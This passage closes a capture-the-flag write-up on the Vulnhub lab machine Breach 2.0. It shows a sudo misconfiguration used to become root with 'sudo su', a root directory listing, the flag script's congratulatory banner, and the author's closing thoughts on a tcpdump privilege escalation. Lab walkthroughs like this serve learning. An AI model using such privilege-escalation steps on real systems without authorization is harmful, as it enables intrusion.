Matching Defaults entries for blumbergh on breach2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on breach2:
    (root) NOPASSWD: /usr/sbin/tcpdump
    (ALL) NOPASSWD: ALL
$ sudo su
root@breach2:/# -
{% endhighlight %}

Privilege Escalation completed!  Now to find the flag and fully pwn the system.

{% highlight bash %}
root@breach2:/# cd ~
root@breach2:~# ls -al
total 64
drwx------  7 root root 4096 Sep 23 15:38 .
drwxr-xr-x 22 root root 4096 Jun 20 14:21 ..
drwx------  2 root root 4096 Jun 21 11:01 .aptitude
-rw-------  1 root root  495 Sep 23 15:40 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root 4096 Jun 19 16:42 .cache
drwx------  3 root root 4096 Jun 19 16:42 .config
-rw-r--r--  1 root root 5074 Jun 22 10:46 .flag.py
drwx------  4 root root 4096 Jun 19 16:42 .mozilla
-rw-------  1 root root  958 Jun 21 10:50 .mysql_history
-rw-------  1 root root   44 Jul 20 20:31 .nano_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root   66 Jun 16 12:59 .selected_editor
drwx------  2 root root 4096 Jun 19 16:42 .ssh
-rw-r--r--  1 root root  810 Sep 23 15:34 sudoers
-rw-------  1 root root    0 Jun 18 19:20 .Xauthority
root@breach2:~# python .flag.py


#========================================================================================#
# ___                                               ___                                  #
#(   )                                             (   )                                 #
# | |.-.    ___ .-.      .--.     .---.    .--.     | | .-.       .--.             .-.   #
# | /   \  (   )   \    /    \   / .-, \  /    \    | |/   \     ;  _  \         /    \  #
# |  .-. |  | ' .-. ;  |  .-. ; (__) ; | |  .-. ;   |  .-. .    (___)` |        |  .-. ; #
# | |  | |  |  / (___) |  | | |   .'`  | |  |(___)  | |  | |         ' '        | |  | | #
# | |  | |  | |        |  |/  |  / .'| | |  |       | |  | |        / /         | |  | | #
# | |  | |  | |        |  ' _.' | /  | | |  | ___   | |  | |       / /          | |  | | #
# | '  | |  | |        |  .'.-. ; |  ; | |  '(   )  | |  | |      / /      .-.  | '  | | #
# ' `-' ;   | |        '  `-' / ' `-'  | '  `-' |   | |  | |     / '____  (   ) '  `-' / #
#  `.__.   (___)        `.__.'  `.__.'_.  `.__,'   (___)(___)   (_______)  `-'   `.__,'  #
#             									         #		
#========================================================================================#


Congratulations on reaching the end. I have learned a ton putting together these challenges and I hope you enjoyed it and perhaps learned something new. Stay tuned for the final in the series, Breach 3.0

Shout-out to sizzop, knightmare and rastamouse for testing and g0tmi1k for hosting and maintaining #vulnhub.

-mrb3n




root@breach2:~# -
{% endhighlight %}

## Final Thoughts

Loving this series so far.  I really enjoy the theming of it and the techniques required really make you think.  I had no idea there was a privesc possible with tcpdump.  I've seen them with nmap and other tools but not with tcpdump as of yet.  Overall really enjoyable.

Big thanks to mrb3n for creating this system and [Vulnhub](https://www.vulnhub.com/) for providing it!
